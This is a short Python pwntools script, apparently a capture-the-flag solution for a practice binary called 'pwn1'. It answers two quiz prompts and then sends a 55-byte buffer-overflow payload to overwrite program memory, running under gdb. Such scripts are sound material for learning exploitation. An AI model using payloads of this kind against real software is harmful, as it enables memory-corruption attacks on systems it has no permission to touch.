from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

#p = process('./pwn1', 'break main')
#gdb.attach(p)
p = gdb.debug('./pwn1', 'break main+305')


answer1 = "Sir Lancelot of Camelot"
answer2 = "To seek the Holy Grail."

buf = ""
buf += "A" * 51
buf += "B" * 4

print p.recv()
p.sendline(answer1)

print p.recv()
p.sendline(answer2)

print p.recvuntil("secret?\n")
p.sendline(buf)

p.interactive()
